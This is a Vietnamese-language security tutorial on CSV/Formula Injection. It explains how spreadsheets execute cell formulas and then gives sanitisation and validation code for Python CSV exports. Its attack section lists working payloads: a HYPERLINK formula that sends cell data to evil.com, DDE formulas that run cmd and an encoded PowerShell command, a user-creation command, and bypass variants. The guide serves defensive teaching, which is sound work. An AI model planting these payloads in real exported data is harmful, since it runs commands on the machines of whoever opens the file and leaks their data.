# CSV/Formula Injection

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-1236 | **Nguồn**: OWASP, James Kettle Research

## 🧱 Kiến thức Nền tảng

Khi ứng dụng web cho phép xuất dữ liệu ra file CSV (Comma-Separated Values), file này thường được mở bằng Microsoft Excel, Google Sheets, hoặc LibreOffice Calc. Các phần mềm bảng tính này **tự động phân tích nội dung ô** — nếu giá trị bắt đầu bằng các ký tự đặc biệt như `=`, `+`, `-`, `@`, `\t`, `\r`, phần mềm sẽ hiểu đó là **công thức** (formula) và thực thi nó.

Quy trình xuất CSV thông thường:

```python
# Normal CSV export in a Python web application
import csv
from io import StringIO

def export_users(users):
    output = StringIO()
    writer = csv.writer(output)
    
    # Write header row
    writer.writerow(["Name", "Email", "Phone"])
    
    # Write user data rows
    for user in users:
        writer.writerow([user.name, user.email, user.phone])
    
    return output.getvalue()

# Example output (safe data):
# Name,Email,Phone
# Alice,alice@corp.com,+84-123-456-789
```

Ngoài công thức Excel cơ bản (`=SUM`, `=VLOOKUP`), Excel còn hỗ trợ **DDE (Dynamic Data Exchange)** — một giao thức cũ cho phép gọi chương trình bên ngoài. Kết hợp với khả năng thực thi formula, đây là vector tấn công nguy hiểm: kẻ tấn công nhập dữ liệu chứa payload vào ứng dụng, và khi admin xuất CSV rồi mở bằng Excel, payload sẽ chạy.

## 🔍 Mô tả lỗ hổng

CSV/Formula Injection (còn gọi là **CSV Injection** hoặc **Formula Injection**) xảy ra khi:

1. Ứng dụng cho phép người dùng **nhập dữ liệu** (đăng ký tên, bình luận, địa chỉ...).
2. Dữ liệu đó được **xuất ra CSV** mà không lọc các ký tự nguy hiểm.
3. Người quản trị hoặc người dùng khác **mở file CSV** bằng phần mềm bảng tính.

Hậu quả: thực thi lệnh hệ thống trên máy nạn nhân, đánh cắp dữ liệu từ spreadsheet, hoặc gửi dữ liệu đến server của kẻ tấn công.

## ⚔️ Cơ chế tấn công

**Payload 1 — Đánh cắp dữ liệu qua HYPERLINK:**

```
=HYPERLINK("https://evil.com/steal?data="&A1&"_"&B1, "Click to verify")
```
Khi nạn nhân click, giá trị ô A1 và B1 được gửi đến server kẻ tấn công qua URL.

**Payload 2 — Thực thi lệnh qua DDE (Dynamic Data Exchange):**

```
=cmd|'/C powershell -ep bypass -e JABjAD0ATgBlAHcALQBPAGIA...'!A0
```

```
+cmd|'/C calc.exe'!A0
```

**Payload 3 — Kẻ tấn công đăng ký với tên chứa payload:**

```
# Attacker registers with this "name" in the web application
Name: =cmd|'/C net user hacker P@ss123 /add'!A0
Email: attacker@evil.com
```

```csv
Name,Email,Phone
Alice,alice@corp.com,+84-123-456-789
=cmd|'/C net user hacker P@ss123 /add'!A0,attacker@evil.com,
```

Khi admin export danh sách user ra CSV và mở bằng Excel → Excel thực thi lệnh `cmd` → tạo user mới trên máy admin.

**Payload 4 — Bypass bằng các ký tự thay thế:**

```
-1+1+cmd|'/C calc'!A0
@SUM(1+1)*cmd|'/C calc'!A0
%0A=cmd|'/C calc'!A0
```

## 🛡️ Biện pháp phòng thủ

1. **Thêm tiền tố `'` (single quote)** trước các giá trị nguy hiểm — Excel sẽ hiểu là text thuần:
   ```python
   # SECURE: Prefix dangerous characters with single quote
   DANGEROUS_CHARS = ('=', '+', '-', '@', '\t', '\r', '\n')
   
   def sanitize_csv_value(value):
       """Prevent formula injection in CSV exports"""
       value = str(value)
       if value.startswith(DANGEROUS_CHARS):
           return "'" + value  # Excel treats as plain text
       return value
   ```

2. **Escape toàn bộ bằng tab prefix** (phương pháp mạnh hơn):
   ```python
   # SECURE: Prepend tab character to neutralize formulas
   def sanitize_csv_field(value):
       value = str(value)
       if value and value[0] in "=+-@\t\r":
           return "\t" + value  # Tab prefix prevents execution
       return value
   ```

3. **Validate input đầu vào** — từ chối hoặc encode các ký tự công thức ngay khi người dùng nhập:
   ```python
   # SECURE: Input validation at data entry point
   import re
   
   def validate_user_input(field_name, value):
       # Reject values starting with formula characters
       if re.match(r'^[=+\-@\t\r]', value):
           raise ValidationError(
               f"{field_name} cannot start with special characters: = + - @ "
           )
       return value
   ```

4. **Sử dụng định dạng XLSX** với thư viện chuyên dụng (openpyxl) thay vì CSV thuần — có thể đặt cell format là Text.

## 💻 Code Example

```python
# ❌ VULNERABLE: Direct CSV export without sanitization
@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output)
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([u.name, u.email])  # Dangerous: u.name could be "=cmd|..."
    return Response(output.getvalue(), mimetype="text/csv")

# ✅ SECURE: Sanitize all fields before CSV export
FORMULA_CHARS = set("=+-@\t\r\n")

def safe_csv_value(val):
    """Neutralize potential formula injection payloads"""
    s = str(val)
    if s and s[0] in FORMULA_CHARS:
        return "'" + s  # Single-quote prefix = treat as text in Excel
    return s

@app.route("/export/users")
def export_users():
    users = User.query.all()
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)  # Quote all fields
    writer.writerow(["Name", "Email"])
    for u in users:
        writer.writerow([safe_csv_value(u.name), safe_csv_value(u.email)])
    return Response(output.getvalue(), mimetype="text/csv")
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/daily-swig/csv-injection
- OWASP: https://owasp.org/www-community/attacks/CSV_Injection
- CWE: https://cwe.mitre.org/data/definitions/1236.html
- James Kettle: https://www.contextis.com/en/blog/comma-separated-vulnerabilities
